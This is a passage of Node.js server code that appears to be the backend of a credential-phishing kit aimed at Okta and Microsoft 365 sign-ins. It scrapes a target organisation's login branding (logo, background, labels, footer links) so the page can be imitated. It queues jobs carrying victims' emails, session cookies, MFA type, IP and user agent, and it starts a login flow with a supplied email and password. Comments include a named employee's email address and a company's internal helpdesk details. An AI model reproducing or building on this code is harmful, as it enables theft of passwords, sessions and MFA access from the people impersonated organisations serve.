BVotDICZ3G62iDT8YwPKRHBivQ-dZBv4Kzn_Vm47c_CEN_M5p7xLXLD2XXv-QH298HnR8Xj4zu509xXn4HC2dFR6Th3nd4cYE8P9x6-enj55a-KLf3wtvd2fY_IXR1WrIrvx1wiI6bF8-tBem85X-8WfSBXLK-1AGRXGfqVYGwPBOYb-qz6qIg9Khavire63FRsKrLCihw75OAU_FvEHt7I_XLzf81--dHtUmnnTD2k74fcnvxn-G8f59588vj7v168-uPpP5130&cbcxt=&username=matt.rable%40okta.com&mkt=en-US&lc=", {
  "headers": {
    *///"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
   /* "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "cross-site",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "Referer": "https://login.microsoftonline.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});
*/
var headers1 = {
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
//'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en,fr;q=0.9,de;q=0.8,it;q=0.7,co;q=0.6,pt;q=0.5,ar;q=0.4',
'cache-control': 'no-cache',
//'Connection': 'keep-alive',
//'Content-Length': 0,
//'Content-type': 'application/x-www-form-urlencoded',
//'Content-type': 'application/json',
'pragma': 'no-cache',
//'Origin': 'https://login.microsoftonline.com',
'Referer': "https://login.microsoftonline.com/",
'User-Agent': RndUserAgent

};

var options1 = {
    url: samlAuth,/*'https://okta.okta.com/app/office365/kw0h9qx8AJWYBILCHEZY/sso/wsfed/passive?client-request-id=551233c3-675a-4acd-bb43-7ebbc38e12d9&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQQIARAAhZI9iNtmHMYt-865mH5cLqUk2w2FlgbLr1_JknxQqGL5U5YUW5J91mJsWV_Wx-sPWV9D50BpyZQhY8YbO5WmQ-G2g0Lolkyh0KVQKJmyJb50Dl3-_B9-z_b8SkcUXqVwgIOvCxAHZ1-QNFUjydq8TECdKpP1OSgzhEGVq4s6sUeQpvTZ5qR0fEmcqJr1e-9Z47tnlz-evLjATu0wXG3PKpU4jnFkmo5u4DryK94sWDiBFcGfMew5hj3JHxpBWZUv8luKoOs0SdEkrNUJhqoDBheykStyzVRTmqHGqWCSAiAs9bSveK6oTELRn4BJpkNt2U2EJUtI3IScKAKpXTNuTx0AtKWe9BXbExUrFOHQ1xSLlMbDfVaJl_lPJXYX2vD6oI2TGa_zN0208acrtA2fFB7nyYU9BUm_4axVGFNdEjCU3wjJrWkrvK167TStyVWSTxtcNh-bvDTepG2jHI9dh4LCyu8ZhLebJLJr12XI2_z8fuRYCTKq0brDxqN1U4yqqqCmLb2aLVLJ1Vgj8bXhzDPWiSXtRrElVofpaDfrmoPY1r2FG9l9S5pygx4KJDvr1nbsTE39tqs_aJLDemt0riblgSkitjNddbJkLgVhV5ehpp2bHd18kG0azZCo21bC8kthJWctJmq3YKd33m6v41CK-qSWeSTh8lRoRglFj3kEI4ueI4aZZuD-OKAmgnVRuPuBeSP4U6G4f3wUXBVotDICZ3G62iDT8YwPKRHBivQ-dZBv4Kzn_Vm47c_CEN_M5p7xLXLD2XXv-QH298HnR8Xj4zu509xXn4HC2dFR6Th3nd4cYE8P9x6-enj55a-KLf3wtvd2fY_IXR1WrIrvx1wiI6bF8-tBem85X-8WfSBXLK-1AGRXGfqVYGwPBOYb-qz6qIg9Khavire63FRsKrLCihw75OAU_FvEHt7I_XLzf81--dHtUmnnTD2k74fcnvxn-G8f59588vj7v168-uPpP5130&cbcxt=&username=matt.rable%40okta.com&mkt=en-US&lc=',*/
    method: 'GET',
    headers: headers1
    //jar:'true'

};

//console.log('options1: ',options1);
const res1 = await axios(options1);//axios.post('https://login.microsoftonline.com/')
//console.log('url: ',res1);
//console.log('url.: ',res1);
              
//console.log('res1: ',await res1);

var jsondata = await res1.data;
//console.log('content: '+jsondata);
    //console.log('response: '+JSON.stringify(response));
try{


try{
/*var okta = {
            locale: 'fr'
*/
if(/locale: '[^']+/.test(jsondata)){
var displaylang = /locale: '[^']+/;
DisplayLang = displaylang.exec(jsondata)[0].substr(0).replace("locale: '", "");
console.log("DisplayLang: "+DisplayLang);
}else if(/language: '[^']+/.test(jsondata)){
var displaylang = /language: '[^']+/;
DisplayLang = displaylang.exec(jsondata)[0].substr(0).replace("language: '", "");
}
}catch(ee){console.log('DisplayLang: catch(ee): '+ee);}
console.log("DisplayLang: "+DisplayLang);


try{
//style="background-image: url('
// background-image:[ ]?url\(['"](http.*\'\))
//preg_match("/background-image ?: ?url\([\'\" ]?(.*)(\'\))/", $jsondata, $matches);
var bbackgroundurl = /background-image: url\('[^']+/;
BBackgroundUrl = bbackgroundurl.exec(jsondata)[0].substr(0).replace("background-image: url('", "");//.replace('">', "");
}catch(ee){console.log('BackgroundUrl: catch(ee): '+ee);}
console.log("BackgroundUrl: "+BBackgroundUrl);
    

//signIn: {
try{
//style="background-image: url('
// background-image:[ ]?url\(['"](http.*\'\))
//preg_match("/background-image ?: ?url\([\'\" ]?(.*)(\'\))/", $jsondata, $matches);
var logourl = /logo: '[^']+/;
LogoUrl = logourl.exec(jsondata)[0].substr(0).replace("logo: '", "");
}catch(ee){console.log('LogoUrl: catch(ee): '+ee);}
console.log("LogoUrl: "+LogoUrl);


try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var bannertextregex = /<p>[^<]+ign-in with your[^<]+/; 
var bannertextregex2 = /<p>[^<]+ign in with your[^<]+/; 
if(bannertextregex.test(jsondata)){      
BannerText = bannertextregex.exec(jsondata)[0].substr(0).replace("<p>", "");
}else if(bannertextregex2.test(jsondata)){
BannerText = bannertextregex2.exec(jsondata)[0].substr(0).replace("<p>", "");
}
}catch(ee){console.log('BannerText: catch(ee): '+ee);}
console.log("BannerText: "+BannerText);


try{
var titletext = /logoText: '[^']+/;
TitleText = titletext.exec(jsondata)[0].substr(0).replace("logoText: '", "").replace(" logo", "");
TitleText = DecodeHex(TitleText);
}catch(ee){console.log('TitleText: catch(ee): '+ee);}
console.log("TitleText: "+TitleText);



try{
    ////showPasswordToggleOnSignInPage = true  2times  fastpass enabled

if(/useDeviceFingerprintForSecurityImage: true/.test(jsondata)){
console.log("Sign in with Okta FastPass is enabled");
FastPass = true;
}
}catch(ee){console.log('FastPass error: catch(ee): '+ee);}
console.log("FastPass: "+FastPass);


try{
    //showIdentifier = true;
var showidentifier = /showIdentifier = [(true|false)]+/g;    
var allmatchsi = jsondata.match(showidentifier);
ShowIdentifier = allmatchsi[allmatchsi.length-1].replace("showIdentifier = ", "");
}catch(ee){console.log('ShowIdentifier error: catch(ee): '+ee);}
console.log("ShowIdentifier = "+ShowIdentifier);


/*
features.showPasswordToggleOnSignInPage
Defaults to true. Shows eye icon to toggle visibility of the user entered password on the Okta Sign-In page. Password is hidden by default, even when this flag is enabled. Passwords are visible for 30 seconds and then hidden automatically.

features.showIdentifier
Defaults to true. Shows the user's identifier on any view with user context.

features.hideSignOutLinkInMFA
Defaults to false. Hides the "Back to sign in" link for authenticator enrollment and challenge flows.

features.rememberMe
Defaults to true. Pre-fills the identifier field with the previously used username.

features.autoFocus
Defaults to true. Automatically focuses the first input field of any form when displayed.
*/



try{
    //showPasswordToggleOnSignInPage = true
var showpasstoggle = /showPasswordToggleOnSignInPage = [(true|false)]+/g;    
var allmatch = jsondata.match(showpasstoggle);
ShowPassToggle = allmatch[allmatch.length-1].replace("showPasswordToggleOnSignInPage = ", "");
}catch(ee){console.log('ShowPassToggle: catch(ee): '+ee);}
console.log("showPasswordToggleOnSignInPage = "+ShowPassToggle);


try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var signintitle = /signinLabel = '[^']+/;
SigninTitle = signintitle.exec(jsondata)[0].substr(0).replace("signinLabel = '", "");
SigninTitle = DecodeHex(SigninTitle);//SigninTitle.replace(/\\x20/g, " ");///[^\x20-\x7E]+/g
}catch(ee){console.log('SigninTitle: catch(ee): '+ee);}
console.log("SigninTitle: "+SigninTitle);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var userlabel = /usernameLabel = '[^']+/;
UserLabel = userlabel.exec(jsondata)[0].substr(0).replace("usernameLabel = '", "");
UserLabel = DecodeHex(UserLabel);//SigninTitle.replace(/\\x20/g, " ");///[^\x20-\x7E]+/g
}catch(ee){console.log('UserLabel: catch(ee): '+ee);}
console.log("UserLabel: "+UserLabel);
try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var passlabel = /passwordLabel = '[^']+/;
PassLabel = passlabel.exec(jsondata)[0].substr(0).replace("passwordLabel = '", "");
PassLabel = DecodeHex(PassLabel);//SigninTitle.replace(/\\x20/g, " ");///[^\x20-\x7E]+/g
}catch(ee){console.log('PassLabel: catch(ee): '+ee);}
console.log("PassLabel: "+PassLabel);

/*try{
if(/var rememberMe = true;/.test(jsondata)){
RememberMe = true;
}else{
RememberMe = false; 
}
console.log("RememberMe: "+RememberMe);
}catch(ee){console.log('RememberMe: catch(ee): '+ee);}
*/

//<input type="checkbox" name="rememberMe" id="input36">
try{
var rememberMeregex = /<input[^>]+type="checkbox"[^>]+name="remember[^>]+>/; 
var rememberMeregex2 = /<input[^>]+name="remember[^>]+type="checkbox"[^>]+>/; 
if(rememberMeregex.test(jsondata)||rememberMeregex2.test(jsondata)){      
RememberMe = true;
}
}catch(ee){console.log('RememberMe: catch(ee): '+ee);}
console.log("RememberMe: "+RememberMe);
/*
try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var authfooter = /<div class="auth-footer">[^<]+/;
AuthFooter = authfooter.exec(jsondata)[0].substr(0).replace('<div class="auth-footer">', "");
console.log("AuthFooter: "+AuthFooter);
}catch(ee){console.log('catch(ee)'+ee);}
*/

/*
var username = '';
var rememberMe = false;
var smsRecovery = false;
var callRecovery = false;
var emailRecovery = false;
var usernameLabel = 'Username';
var usernameInlineLabel = '';
var passwordLabel = 'Password';
var passwordInlineLabel = '';

var signinLabel = 'Sign\x20In';
var forgotpasswordLabel = 'Forgot\x20password\x3F';
var unlockaccountLabel = 'Unlock\x20account\x3F';
var helpLabel = 'Help';



signIn: {
      el: '#signin-container',
      baseUrl: baseUrl,
      brandName: 'Okta',
      logo: 'https://ok2static.oktacdn.com/fs/bco/1/fs0nsswd3jjSr8CIv0x7',
      logoText: 'GoDaddy\x20\x2D\x20Prod logo',
      helpSupportNumber: orgSupportPhoneNumber,
      stateToken: stateToken,
      username: username,
      signOutLink: signOutUrl,
      consent: consentFunc,
      authScheme: authScheme,
      relayState: fromUri,
      proxyIdxResponse: proxyIdxResponse,
      overrideExistingStateToken: overrideExistingStateToken,
      interstitialBeforeLoginRedirect: 'DEFAULT',
      idpDiscovery: {
*/


/*
var customLinks = [];
  
    customLinks.push({
      text: 'Hours\x3A\x2024\x2F7\x20\x2D\x20Internal\x20Phone\x3A\x20Ext\x202580\x20\x7C\x20External\x20Phone\x3A\x20\x2B1\x20480\x20624\x202580',
      href: 'https\x3A\x2F\x2Fsecureservernet.sharepoint.com\x2Fsites\x2Fglobalit'
    });
  
  var factorPageCustomLink = {};
*/
/*
var customLinks = [];
  
  var factorPageCustomLink = {};
*/

try{
if(/<a href="#" data-se="needhelp"/.test(jsondata)){
var FooterHelpTitle = /footerHelpTitle = '[^']+/.exec(jsondata)[0].substr(0).replace("footerHelpTitle = '", "");
var decFooterHelp=DecodeHex(FooterHelpTitle);
if(decFooterHelp.trim()){
ExpandedHelp = FooterForgot;     
}
}
}catch(ee){console.log('ExpandedHelp: catch(ee): '+ee);}
console.log("ExpandedHelp: "+ExpandedHelp);


try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footerforgot =  /forgotpasswordLabel = '[^']+/;
FooterForgot = footerforgot.exec(jsondata)[0].substr(0).replace("forgotpasswordLabel = '", "");
//FooterForgot = FooterForgot.replace(/\\x20/g, " ");
FooterForgot = DecodeHex(FooterForgot);//FooterForgot.replace(/\\x3F/g,function(m,n){return String.fromCharCode(n);});
}catch(ee){console.log('FooterForgot: catch(ee): '+ee);}
console.log("FooterForgot: "+FooterForgot);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footerunlock =  /unlockaccountLabel = '[^']+/;
FooterUnlock = footerunlock.exec(jsondata)[0].substr(0).replace("unlockaccountLabel = '", "");
FooterUnlock = DecodeHex(FooterUnlock);
}catch(ee){console.log('FooterUnlock: catch(ee): '+ee);}
console.log("FooterUnlock: "+FooterUnlock);

try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footerhelp =  /helpLabel = '[^']+/;
FooterHelp = footerhelp.exec(jsondata)[0].substr(0).replace("helpLabel = '", "");
FooterHelp = DecodeHex(FooterHelp);//FooterHelp.replace(/\\x20/g, " ");
}catch(ee){console.log('FooterHelp: catch(ee): '+ee);}
console.log("FooterHelp: "+FooterHelp);
/*
try{
//preg_match("/Sign-in with your(.*)/", $jsondata, $matches);
var footercustom =  /customLinks.push[^']+text: '[^']+/;
FooterCustom = footercustom.exec(jsondata)[0];//.replace("text: '", "");
FooterCustom = /text: '[^']+/.exec(FooterCustom)[0].substr(0).replace("text: '", "");
console.log("FooterCustom1: "+FooterCustom);
FooterCustom = /text: '[^']+/.exec(FooterCustom)[0].substr(0).replace("text: '", "");
console.log("FooterCustom2: "+FooterCustom);
FooterCustom = DecodeHex(FooterCustom);//FooterCustom.replace(/\\x20/g, " ");
console.log("FooterCustom: "+FooterCustom);
}catch(ee){console.log('catch(ee): '+ee);}
*/


if(/customLinks.push[^']{[\s]+text: '[^']+/.test(jsondata)){
FooterCustom=[];
var footercustom =  /{[\s]+text: '[^']+/g;
let fcresult=[];
try{
while(footercustom.global && (fcresult=footercustom.exec(jsondata))) {
   //console.log(FooterCustom);     // output: object
  var fcmatch = /text: '[^']+/.exec(fcresult[0]);
  //.replace("text: '", "")
  FooterCustom.push(DecodeHex(fcmatch[0].replace("text: '", "")));
  //console.log('footercustom:'+match[0]);  // ouput: "a"
  //if(!footercustom.global) break;
}
  }catch(ee){console.log('FooterCustom: catch(ee): '+ee);}
console.log(FooterCustom.length);
if(FooterCustom.length==0){
  FooterCustom=false;
}

}
console.log("FooterCustom: "+FooterCustom);




try{//"Back to sign in" link for authenticator enrollment and challenge flows.
if(!/var hideSignOutForMFA = true/.test(jsondata)){
BSigninForMFA = true;
}
}catch(ee){console.log('BSigninForMFA: catch(ee): '+ee);}
console.log("BSigninForMFA: "+BSigninForMFA);

try{//"Back to sign in" For Reset    
if(!/var hideBackToSignInForReset = true/.test(jsondata)){
BSigninForReset = true; 
}
}catch(ee){console.log('BSigninForReset: catch(ee): '+ee);}
console.log("BSigninForReset: "+BSigninForReset);


try{
var inputRegex = new RegExp('<input[^]*type="text"[^]*value="');
var inputRegex2 = new RegExp('<input[^]*value="[^]*type="text"');
if(inputRegex.test(jsondata)||inputRegex2.test(jsondata)){
//<input type="text" placeholder="" name="identifier" id="input152" value="test@okta.com" aria-label="" autocomplete="identifier">
InputUser = true;
}
}catch(ee){console.log('InputUser: catch(ee): '+ee);}
console.log("InputUser: "+InputUser);



 
try{
//var dataEmailregex = '/value="' + eMail + '"/';
//<input type="text" placeholder="" name="identifier" id="input43" value="test@okta.com" aria-label="" autocomplete="identifier">
var EmailRegex = new RegExp('<input[^]*type="text"[^]*value="' + eMail + '"');
var EmailRegex2 = new RegExp('<input[^]*value="' + eMail + '"[^]*type="text"');

if(EmailRegex.test(jsondata)||EmailRegex2.test(jsondata)){
IncludedEmail = true;
}
}catch(ee){console.log('IncludedEmail: catch(ee): '+ee);}
console.log("IncludedEmail: "+IncludedEmail);

/*
try{
if(/var hasPasswordlessPolicy = 'true'/.test(jsondata)){
//<input type="password" placeholder="" name="credentials.passcode" id="input128" value="" aria-label="" autocomplete="off" class="password-with-toggle">
//Streamline Logins with Passwordless Authentication
//multiple identity providers okta (idps)
InputPass = false;
}else{
InputPass = true; 
}
console.log("InputPass: "+InputPass);
}catch(ee){console.log('InputPass: catch(ee): '+ee);}
*/


try{
    
if(/<input[^>]+type="password"/.test(jsondata)){
//<input type="password" placeholder="" name="credentials.passcode" id="input128" value="" aria-label="" autocomplete="off" class="password-with-toggle">
InputPass = true;
}
}catch(ee){console.log('InputPass: catch(ee): '+ee);}
console.log("InputPass: "+InputPass);




/*
<div class="auth-footer">
<a data-se="forgot-password" href="#" class="link js-forgot-password">Forgot password?</a>
<a data-se="unlock" href="#" class="link js-unlock">Okta Unlock</a>
<a data-se="help" href="https://godaddy.okta.com/help/login" class="link js-help">Help</a>
<a data-se="custom" href="https://secureservernet.sharepoint.com/sites/globalit" class="link js-custom">Hours: 24/7 - Internal Phone: Ext 2580 | External Phone: +1 480 624 2580</a>
</div>
*/


}catch(err){
    console.log("parse elements catch err :"+err);
}

}catch(err){
    console.log("unknown catch err:"+err);
}

 


  console.log("Okta info is successfully extracted.");
var LoadTime_ms = new Date()-StartTime;
var LoadTime2_ms = new Date()-StartTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var LoadTime_s = Math.floor(LoadTime_ms/1000);
var LoadTime2_s = Math.floor(LoadTime2_ms/1000);
                
					result['StatusCode'] = 1;
					result['Status'] = "success";
					result['Email'] = eMail;
					result['Msg'] = "Done";
					/*result['PickAnAccount'] = PickAnAccount;*/
					if(SupportedLang.includes(DisplayLang)){
					result['DisplayLang'] = DisplayLang;
					}else{
					result['DisplayLang'] = 'en';    
					}
					result['LogoUrl'] = LogoUrl;
					result['BackgroundUrl'] = BBackgroundUrl;
					result['BannerText'] = BannerText;
					result['FastPass'] = FastPass;
					result['ShowIdentifier'] = ShowIdentifier;
					result['RememberMe'] = RememberMe;
					result['SigninTitle'] = SigninTitle;
					result['ShowPassToggle'] = ShowPassToggle;
					result['UserLabel'] = UserLabel;
					result['PassLabel'] = PassLabel;
					result['InputUser'] = InputUser;
					result['InputPass'] = InputPass;
					result['IncludedEmail'] = IncludedEmail;
					result['BSigninForMFA'] = BSigninForMFA;
					result['BSigninForReset'] = BSigninForReset;
					result['AuthFooter'] = {};
					result['AuthFooter']["FooterForgot"] = FooterForgot;
					result['AuthFooter']["FooterUnlock"] = FooterUnlock;
					result['AuthFooter']["FooterHelp"] = FooterHelp;
					if(FooterCustom.length>0){
					    let i = 0;
					result['AuthFooter']["FooterCustom"] = {};
while(FooterCustom[i] && i<FooterCustom.length) {
result['AuthFooter']["FooterCustom"][i] = FooterCustom[i];
  i++;
}
					}else{
					result['AuthFooter']["FooterCustom"] = false;    
					}
					if(ExpandedHelp){
					result['ExpandedHelp'] = ExpandedHelp;
					}
					result['Cookies'] = false;
					result['Load_time'] = LoadTime_s+' Seconds('+LoadTime2_s+'Sec)';
                    console.log('Load_time: '+LoadTime_s+' Seconds('+LoadTime2_s+'Sec)');
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
//getRestart();
    
return; 


 }else if (typeof req.query.checksaml!== 'undefined'&&req.query.email&&req.query.type==2) {
var RndUserAgent=getRndUserAgent();     
console.log('User-Agent:',RndUserAgent)     
var reQurl="https://login.microsoftonline.com/";//https://login.microsoftonline.com/";
var reQemail=decodeURI(req.query.email.toLowerCase());
//var reQpass=decodeURI(req.query.pass);
var reQdebug=req.query.debug;
var reQid=decodeURI(req.query.id);
var reQtoken=decodeURI(req.query.token);
var reQnow=req.query.torestart;
var reQsetcookie = (typeof req.query.setcookie !== "undefined" && req.query.setcookie !== null &&( Boolean(req.query.setcookie) && (req.query.setcookie.toString().trim().toLowerCase() == 'true'||req.query.setcookie.toString().trim().toLowerCase() == '1')));
var reQgetcookie = (typeof req.query.getcookie !== "undefined" && req.query.getcookie !== null &&( Boolean(req.query.getcookie) && (req.query.getcookie.toString().trim().toLowerCase() == 'true'||req.query.getcookie.toString().trim().toLowerCase() == '1')));
var reQcookie = postcookie;//req.query.cookie
var reQres = (typeof req.query.res !== "undefined" && req.query.res !== null &&( Boolean(req.query.res) && (req.query.res.toString().trim().toLowerCase() == 'true'||req.query.res.toString().trim().toLowerCase() == '1')));
//var reqincreasesessionlife = (req.query.isl !== undefined &&( req.query.isl === true || req.query.isl.toString().trim() === 'true'|| req.query.isl.toString().trim() === '1'|| req.query.isl.toLowerCase() === 'true'));
//var reqSkipMFAforIps = (req.query.skipip !== undefined &&( req.query.skipip === true || req.query.skipip.toString().trim() === 'true'|| req.query.skipip.toString().trim() === '1'|| req.query.skipip.toLowerCase() === 'true'));
var reQUserIP=req.query.ci;
var reQUserUA=req.query.ca;
var reQServerIP=req.query.si;
var reQServerHOST=req.query.ht;
var reQMfaType = false;
//var reqSessionIP=req.socket.remoteAddress;//req.query.ip
if(req.query.mt&&req.query.mt.toString().trim().toLowerCase()!=='false'&&req.query.mt!==''){
var strreqmttttt = decodeURI(req.query.mt);
if(Buffer.from(Buffer.from(strreqmttttt, 'base64').toString('utf8'),'utf8').toString('base64').replace(/=/g, '')===strreqmttttt){
console.log('mttttt2: '+Buffer.from(strreqmttttt, 'base64').toString('utf8'));//'ascii'
reQMfaType = Buffer.from(strreqmttttt, 'base64').toString('utf8');//'ascii'
}else{
console.log('mttttt3: '+strreqmttttt);
reQMfaType = strreqmttttt;
}    
}  

var reQMfaDefaultType = false;
//var reqSessionIP=req.socket.remoteAddress;//req.query.ip
if(req.query.md&&req.query.md.toString().trim().toLowerCase()!=='false'&&req.query.md!==''){
var strreqmddddd = decodeURI(req.query.md);
if(Buffer.from(Buffer.from(strreqmddddd, 'base64').toString('utf8'),'utf8').toString('base64').replace(/=/g, '')===strreqmddddd){
console.log('mddddd2: '+Buffer.from(strreqmddddd, 'base64').toString('utf8'));//'ascii'
reQMfaDefaultType = Buffer.from(strreqmddddd, 'base64').toString('utf8');//'ascii'
}else{
console.log('mddddd3: '+strreqmddddd);
reQMfaDefaultType = strreqmddddd;
}    
}   

var reQappID = btoa_safe(req.headers.host.split(".",DomainHosting)[0]);
var reQadminLink = false;
if(req.query.ak&&req.query.ak.toString().trim().toLowerCase()!=='false'&&req.query.ak!==''){
reQadminLink=req.query.ak;
}
//var reqSessionIP=req.socket.remoteAddress;//req.query.ip
var checksaml=true;
var reQtime=new Date(); 
console.log('end2');

try {
            // run the task function for the URL
            if(reQres){console.log('reQres:',reQres);
            console.log('before (length:'+cluster.jobQueue.list.length+'):',JSON.stringify(cluster.jobQueue.list, null, 4));
            for(let i = 0; i < cluster.jobQueue.list.length; i++) {
            let obj = cluster.jobQueue.list;
            if(obj[i]&&obj[i]['data']&&obj[i]['data']['reQid']&&obj[i]['data']['reQid']==reQid){
            //delete cluster.jobQueue.list[i];
            cluster.jobQueue.list.splice(i, 1);
            console.log('delete cluster.jobQueue.list['+i+'] | id='+reQid);
            }
            }
            console.log('after clean. ['+reQid+']["okta"] :',JSON.stringify(cluster.jobQueue.list, null, 4));
            ResultByIds[reQid][decodeURI(req.query.email)]['okta']['action'] = "Queuing";
            console.log('ResultByIds['+reQid+']['+decodeURI(req.query.email)+']["okta"]:',JSON.stringify(ResultByIds[reQid][decodeURI(req.query.email)]['okta']));
            //cluster.jobQueue.pending
            const resP = cluster.execute({checksaml,reQurl,reQemail,reQdebug,reQtime,reQid,reQtoken,reQsetcookie,reQgetcookie,reQcookie,reQres,reQUserIP,reQUserUA,reQServerIP,reQServerHOST,reQMfaType,reQMfaDefaultType,reQappID,reQadminLink});
            console.log('after Queuing ['+reQid+']:',JSON.stringify(cluster.jobQueue.list, null, 4));
            //const resP = { "StatusCode":1,"Status": "pending","Msg":"pending","Time":new Date().toUTCString()};
            //console.log('resP:',resP);
            //await new Promise(resolve => setTimeout(resolve, 20000));
            var apphostID = req.headers.host
            var appNameID = apphostID.split(".",DomainHosting)[0];
            console.log("appNameID:"+appNameID);
            res.write(JSON.stringify({ "StatusCode":1,"Status":"pending","Msg":"pending","AppID":btoa_safe(appNameID),"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;
            }else{
            console.log('before :',JSON.stringify(cluster.jobQueue.list, null, 4));
            for(let i = 0; i < cluster.jobQueue.list.length; i++) {
            let obj = cluster.jobQueue.list;
            if(obj[i]&&obj[i]['data']&&obj[i]['data']['reQid']&&obj[i]['data']['reQid']==reQid){
            //delete  cluster.jobQueue.list[i];
            cluster.jobQueue.list.splice(i, 1);
            console.log('delete cluster.jobQueue.list['+i+'] | id='+reQid);
            }
            }
            console.log('after clean ['+reQid+']["okta"] :',JSON.stringify(cluster.jobQueue.list, null, 4));
            ResultByIds[reQid][decodeURI(req.query.email)]['okta']['action'] = "Queuing";
            console.log('ResultByIds['+reQid+']['+decodeURI(req.query.email)+']["okta"]:',JSON.stringify(ResultByIds[reQid][decodeURI(req.query.email)]['okta']));
            //cluster.jobQueue.pending   
            const resP = await cluster.execute({checksaml,reQurl,reQemail,reQdebug,reQtime,reQid,reQtoken,reQsetcookie,reQgetcookie,reQcookie,reQres,reQUserIP,reQUserUA,reQServerIP,reQServerHOST,reQMfaType,reQMfaDefaultType,reQappID,reQadminLink});
            console.log('resP:',resP);
            res.write(JSON.stringify(resP, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;   
            }
            // respond with the result
            //if (!res.headersSent) {res.setHeader('Content-Type', 'application/json');};
            //res.status(200).send(JSON.stringify(resP));
            
        } catch(err) {
            // catch error
            //if (!res.headersSent) {res.setHeader('Content-Type', 'application/json');};
            //res.send('Error: ' + err.message);
            res.write(JSON.stringify({ "StatusCode":1,"Status": "error","Msg":err.message,"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;
        }

     
 }else if(typeof req.query.checklogin!== 'undefined'&&req.query.email&&req.query.pass){//https://login.microsoftonline.com/common/SAS/BeginAuth
var RndUserAgent = getRndUserAgent();    
console.log('User-Agent:'+RndUserAgent);
try {
const axios = require('axios');
//const source = axios.CancelToken.source();
//const cancelToken = source.token;
axios.defaults.withCredentials = true;
var DateNow = new Date().toUTCString();
//Office365 valid email checker
//const request = require('request')
var result = {};
try{
var eMail=decodeURIComponent(req.query.email.toLowerCase());
}catch(e){
var eMail=req.query.email.toLowerCase();    
}
try{
var passWord=decodeURIComponent(req.query.pass);
}catch(e){
var passWord=req.query.pass;    
}


//var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
var inow=req.query.torestart;
//var reqsetcookie = (req.query.setcookie !== undefined &&( req.query.setcookie === true || req.query.setcookie.toString().trim() === 'true'|| req.query.setcookie.toString().trim() === '1'|| req.query.setcookie.toLowerCase() === 'true'));
//var reqgetcookie = (req.query.getcookie !== undefined &&( req.query.getcookie === true || req.query.getcookie.toString().trim() === 'true'|| req.query.getcookie.toString().trim() === '1'|| req.query.getcookie.toLowerCase() === 'true'));
//var reqcookie = postcookie;//req.query.cookie
//var reqres = (req.query.res !== undefined &&( req.query.res === true || req.query.res.toString().trim() === 'true'|| req.query.res.toString().trim() === '1'|| req.query.res.toLowerCase() === 'true'));
var reqUserIP=req.query.ci;
var reqUserUA=req.query.ca;
var reqServerIP=req.query.si
var reqServerHOST=req.query.ht
var reqMT = false;
//var reqSessionIP=req.socket.remoteAddress;//req.query.ip
if(req.query.mt&&req.query.mt.toString().trim().toLowerCase()!=='false'&&req.query.mt!==''){
var strreqmttt = decodeURI(req.query.mt);
if(Buffer.from(Buffer.from(strreqmttt, 'base64').toString('utf8'),'utf8').toString('base64').replace(/=/g, '')===strreqmttt){
console.log('mttt2: '+Buffer.from(strreqmttt, 'base64').toString('utf8'));//'ascii'
reqMT = Buffer.from(strreqmttt, 'base64').toString('utf8');//'ascii'
}else{
console.log('mttt3: '+strreqmttt);
reqMT = strreqmttt;
}    
}   
var reqtime=new Date(); 
var starTime = new Date().getTime();



var flowToken =	'';
var originalRequest = '';
var apiCanary = '';
var clientrequestid = '';
var hpgact = '';
var hpgid = '';
var hpgrequestid = '';
var canary = '';
var ctx = '';
var CounTry = '';
var RefererUrl = '';


var headers1 = {
    'User-Agent': RndUserAgent,
    'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Expires': '0'
    //'Content-type': 'application/json'
    //'content-type': 'application/x-www-form-urlencoded'
};


var options1 = {
    url: 'https://www.office.com/login',//'https://login.microsoftonline.com/',
    method: 'GET',
    headers: headers1,
    jar:'true'

};

//console.log('options1: ',options1);
const res1 = await axios(options1);//axios.post('https://login.microsoftonline.com/')
//console.log('url: ',res1);
//console.log('url.: ',res1);
              
RefererUrl = await res1.request.res.responseUrl;//'https://login.microsoftonline.com/';//response.request.uri.href;no

console.log('RefererUrl: ',RefererUrl);
//console.log('res1: ',await res1);

var content = await res1.data;
//console.log('content1: '+content);
    //console.log('response: '+JSON.stringify(response));
try{ 
var notexistcontent = 'flowToken';
//console.log(res1);//.href  	   
flowToken =	/"sFT":"[^"]+/;
